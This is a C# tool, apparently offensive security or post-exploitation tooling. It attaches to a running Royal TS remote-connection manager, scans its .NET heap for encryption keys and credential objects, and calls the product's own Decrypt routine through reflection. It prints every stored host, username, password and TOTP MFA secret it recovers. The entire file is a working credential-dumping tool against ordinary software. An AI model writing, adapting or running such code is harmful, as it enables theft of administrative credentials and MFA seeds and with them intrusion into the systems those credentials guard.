using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

class Program
{
    static Dictionary<string, string> ReadKvStore(ClrObject obj)
    {
        var kv = new Dictionary<string, string>();
        try {
            var kvStore = obj.ReadObjectField("_keyValueStore");
            if (!kvStore.IsValid || kvStore.Type == null) return kv;
            var entries = kvStore.ReadObjectField("_entries");
            if (!entries.IsValid || entries.Type == null || !entries.Type.IsArray) return kv;
            var arr = entries.AsArray();
            for (int i = 0; i < arr.Length; i++)
            {
                try {
                    var sv = arr.GetStructValue(i);
                    var ko = sv.ReadObjectField("key");
                    var vo = sv.ReadObjectField("value");
                    if (ko.IsValid && ko.AsString() != null)
                        kv[ko.AsString()!] = vo.IsValid ? (vo.AsString() ?? "") : "";
                } catch {}
            }
        } catch {}
        return kv;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: HeapDumper <PID> <RoyalTSInstallDir>"); return; }
        int pid = int.Parse(args[0]);
        string rtDir = args[1];

        Console.WriteLine($"[*] Attaching to PID {pid}...");
        using var target = DataTarget.AttachToProcess(pid, false);

        foreach (var clrInfo in target.ClrVersions)
        {
            Console.WriteLine($"[*] CLR {clrInfo.Version}");
            ClrRuntime runtime;
            try {
                runtime = clrInfo.CreateRuntime();
            } catch {
                // Fallback for air-gapped systems: find DAC locally instead of symbol server
                var clrPath = clrInfo.ModuleInfo.FileName;
                if (!string.IsNullOrEmpty(clrPath)) {
                    var dacPath = Path.Combine(Path.GetDirectoryName(clrPath)!, "mscordaccore.dll");
                    Console.WriteLine($"[*] Symbol server failed, using local DAC: {dacPath}");
                    runtime = clrInfo.CreateRuntime(dacPath);
                } else {
                    throw;
                }
            }
            var heap = runtime.Heap;
            Console.WriteLine($"[*] Scanning heap...");

            string siKey1 = "", siKey2 = "", siDoc = "";
            var docPwdCandidates = new List<string> { "" };
            var credentialInfos = new List<ClrObject>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn1 = obj.Type.Name ?? "";

                // Extract SecurityInterface keys from any object that looks like one
                if (tn1.Contains("RoyalSecurityInterface") || tn1 == "RoyalDocumentLibrary.RoyalStore")
                {
                    var targets = new List<ClrObject>();
                    if (tn1.Contains("RoyalSecurityInterface"))
                    {
                        targets.Add(obj);
                    }
                    else
                    {
                        // V6: SecurityInterface is a property of RoyalStore
                        try {
                            var si = obj.ReadObjectField("<SecurityInterface>k__BackingField");
                            if (si.IsValid && si.Type != null) targets.Add(si);
                        } catch {}
                        try {
                            var siLeg = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField");
                            if (siLeg.IsValid && siLeg.Type != null) targets.Add(siLeg);
                        } catch {}
                    }

                    foreach (var si in targets)
                    {
                        if (!string.IsNullOrEmpty(siKey1)) break;
                        // Try known field names first (V7+)
                        try { var v = si.ReadStringField("smhos"); if (!string.IsNullOrEmpty(v)) siKey1 = v; } catch {}
                        try { var v = si.ReadStringField("smhot"); if (!string.IsNullOrEmpty(v)) siKey2 = v; } catch {}
                        try { var v = si.ReadStringField("smhou"); if (!string.IsNullOrEmpty(v)) siDoc = v; } catch {}

                        // Fallback: detect by value pattern (obfuscated field names in V6)
                        if (string.IsNullOrEmpty(siKey1))
                        {
                            var strFields = new List<(string name, string val)>();
                            foreach (var f in si.Type.Fields)
                            {
                                if (f.ElementType != ClrElementType.String) continue;
                                try {
                                    var v = si.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v));
                                } catch {}
                            }
                            // Key1/Key2 are exactly 50 chars, Doc ends with known extensions
                            var keys = strFields.Where(x => x.val.Length == 50).ToList();
                            var doc = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
                            if (keys.Count >= 2)
                            {
                                siKey1 = keys[0].val;
                                siKey2 = keys[1].val;
                                siDoc = doc.val ?? "";
                                Console.WriteLine($"[*] SecurityInterface keys detected by pattern (fields: {keys[0].name}, {keys[1].name}, {doc.name ?? "?"})");
                            }
                        }
                    }
                    continue;
                }

                // Collect resolved CredentialInfo objects (may contain cleartext)
                if (tn1 == "RoyalDocumentLibrary.CredentialInfo")
                {
                    credentialInfos.Add(obj);
                    continue;
                }

                if (tn1 == "Zxcvbn.Result")
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        try {
                            if (f.ElementType == ClrElementType.String)
                            {
                                var fn = (f.Name ?? "").TrimStart('_', '<').Replace(">k__BackingField", "").ToLowerInvariant();
                                if (fn.Contains("password"))
                                {
                                    var val = obj.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                        docPwdCandidates.Add(val);
                                }
                            }
                        } catch {}
                    }
                    continue;
                }
            }

            // If we found CredentialInfo objects with cleartext passwords, use them directly
            if (string.IsNullOrEmpty(siKey1) && credentialInfos.Count > 0)
            {
                Console.WriteLine($"[*] No encryption keys found, checking {credentialInfos.Count} CredentialInfo object(s) for cleartext...");
                Console.WriteLine("\n##RESULTS_START##");
                bool found = false;
                foreach (var ci in credentialInfos)
                {
                    try {
                        string user = "", pwd = "";
                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                        if (!string.IsNullOrEmpty(pwd))
                        {
                            string keyfile = "", passphrase = "", credId = "";
                            try { keyfile = ci.ReadStringField("<Keyfile>k__BackingField") ?? ""; } catch {}
                            try { passphrase = ci.ReadStringField("<Passphrase>k__BackingField") ?? ""; } catch {}
                            try { credId = ci.ReadStringField("<CredentialID>k__BackingField") ?? ""; } catch {}
                            Console.WriteLine($"CredentialInfo||{user}|||{pwd}||||||||{credId}");
                            found = true;
                        }
                    } catch {}
                }
                if (!found) Console.WriteLine("(no cleartext passwords in CredentialInfo)");
                Console.WriteLine("##RESULTS_END##");
                return;
            }

            if (string.IsNullOrEmpty(siKey1))
            {
                Console.WriteLine("[!] No SecurityInterface keys found on heap");
                Console.WriteLine("[*] Dumping Royal/Security types on heap for diagnostics...");
                var diagTypes = new HashSet<string>();
                foreach (var obj in heap.EnumerateObjects())
                {
                    if (!obj.IsValid || obj.Type == null) continue;
                    var tn = obj.Type.Name ?? "";
                    if ((tn.Contains("Royal") || tn.Contains("Security") || tn.Contains("Credential")) && !tn.EndsWith("[]") && diagTypes.Add(tn))
                    {
                        var fields = string.Join(", ", obj.Type.Fields.Select(f => f.Name ?? "?"));
                        Console.WriteLine($"    [{tn}] fields: {fields}");
                    }
                }
                if (diagTypes.Count == 0)
                    Console.WriteLine("    (none found - is a document open?)");
                Console.WriteLine("\n##RESULTS_START##\n##RESULTS_END##");
                return;
            }
            Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
            Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");

            var entries = new List<(string type, string name, string host, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";
                if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;
                if (!(tn.Contains("Credential") || tn.Contains("Connection")) || tn.EndsWith("[]")) continue;

                var kv = ReadKvStore(obj);
                string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                if (string.IsNullOrEmpty(encPwd)) continue;

                string name = "", host = "", user = "";
                kv.TryGetValue("Name", out name); name ??= "";
                kv.TryGetValue("UserName", out user); user ??= "";
                if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
                kv.TryGetValue("ComputerName", out host); host ??= "";
                if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }

                string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
                string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
                string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
                if (mfaCfg != "0" && mfaCfg != "") {
                    string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
                    otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
                    kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
                    if (otpDigits == "0") otpDigits = "6";
                    kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
                    kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
                }

                string docName = "";
                try {
                    var doc = obj.ReadObjectField("_royalDocument");
                    if (doc.IsValid && doc.Type != null) {
                        var dkv = ReadKvStore(doc);
                        dkv.TryGetValue("Name", out docName); docName ??= "";
                    }
                } catch {}

                entries.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
            }

            var unique = entries.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
            Console.WriteLine($"[*] Found {unique.Count} entry(ies) with encrypted passwords");

            AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
                return File.Exists(p) ? Assembly.LoadFrom(p) : null;
            };

            object? siInst = null;
            MethodInfo? decMethod = null;
            try {
                var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                siInst = Activator.CreateInstance(siType);
                var bf = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;

                // Try known field names first (V7+)
                var fKey1 = siType.GetField("smhos", bf);
                var fKey2 = siType.GetField("smhot", bf);
                var fDoc = siType.GetField("smhou", bf);

                // Fallback: find string fields by pattern (obfuscated names in V6)
                if (fKey1 == null || fKey2 == null)
                {
                    var strFields = siType.GetFields(bf).Where(f => f.FieldType == typeof(string)).ToList();
                    Console.WriteLine($"[*] DLL string fields: {string.Join(", ", strFields.Select(f => f.Name))}");
                    // Set all string fields to empty first, then fill key1/key2/doc
                    // Key fields are the first two string fields, doc is the third
                    if (strFields.Count >= 3)
                    {
                        fKey1 = strFields[0];
                        fKey2 = strFields[1];
                        fDoc = strFields[2];
                        Console.WriteLine($"[*] Using DLL fields: key1={fKey1.Name}, key2={fKey2.Name}, doc={fDoc.Name}");
                    }
                }

                fKey1?.SetValue(siInst, siKey1);
                fKey2?.SetValue(siInst, siKey2);
                fDoc?.SetValue(siInst, siDoc);

                decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
                // Fallback: find any method with matching signature
                if (decMethod == null)
                {
                    foreach (var m in siType.GetMethods(bf))
                    {
                        var pars = m.GetParameters();
                        if (pars.Length == 3 && pars[0].ParameterType == typeof(string) && pars[1].ParameterType == typeof(bool) && pars[2].ParameterType == typeof(string) && m.ReturnType == typeof(string))
                        {
                            decMethod = m;
                            Console.WriteLine($"[*] Decrypt method found as: {m.Name}");
                            break;
                        }
                    }
                }
                Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
            }

            foreach (var x in unique) {
                if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
            }

            Console.WriteLine("\n##RESULTS_START##");

            var knownDocPwd = new Dictionary<string, string>();

            foreach (var e in unique)
            {
                string plainPwd = "", plainTotp = "", usedDp = "";
                if (decMethod != null && siInst != null)
                {
                    string cachedDp = "";
                    if (!string.IsNullOrEmpty(e.docName) && knownDocPwd.TryGetValue(e.docName, out cachedDp))
                    {
                        try {
                            plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, cachedDp }) ?? "");
                            if (!string.IsNullOrEmpty(plainPwd)) usedDp = cachedDp;
                        } catch {}
                    }

                    if (string.IsNullOrEmpty(plainPwd))
                    {
                        foreach (var dp in docPwdCandidates)
                        {
                            try {
                                plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, dp }) ?? "");
                                if (!string.IsNullOrEmpty(plainPwd)) { usedDp = dp; break; }
                            } catch {}
                        }
                    }

                    if (!string.IsNullOrEmpty(plainPwd) && !string.IsNullOrEmpty(e.docName))
                        knownDocPwd[e.docName] = usedDp;

                    if (!string.IsNullOrEmpty(e.encTotp))
                    {
                        try {
                            plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? "");
                        } catch {}
                    }
                }
                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
            }

            Console.WriteLine("##RESULTS_END##");
        }
    }
}
